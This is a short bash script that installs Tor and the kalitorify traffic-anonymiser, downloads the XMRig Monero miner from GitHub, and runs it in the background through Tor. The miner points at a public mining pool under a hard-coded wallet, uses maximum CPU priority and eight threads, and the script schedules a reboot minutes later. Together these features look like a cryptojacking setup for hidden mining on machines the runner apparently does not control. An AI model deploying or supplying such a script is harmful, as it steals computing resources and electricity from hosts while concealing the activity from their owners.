#! /bin/bash
sudo -i
apt-get update -y
sudo apt-get install git build-essential libevent-dev libssl-dev zlib1g-dev -y
sudo apt-get install git tor proxychains tar wget python -y
git clone https://github.com/brainfucksec/kalitorify
wget https://github.com/xmrig/xmrig/releases/download/v6.0.0-beta/xmrig-6.0.0-beta-xenial-x64.tar.gz
cd kalitorify/
sudo make install
kalitorify -t
kalitorify --restart
cd
tar --extract --file xmrig-6.0.0-beta-xenial-x64.tar.gz
sudo sysctl -w vm.nr_hugepages=128
cd xmrig-6.0.0-beta
proxychains torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 4AJifhXDLEb6G8BRqWjQ5sT7XbRb47dUMai1WxNS765NixTpAL771ekW6jZBzDNYUiG4s3wBcUJLSSaFJ3RWDgbnL6B8oxJ -p x -a cn/r -x 9150 -t 8 -k --tls -B --background
sudo shutdown -r +8
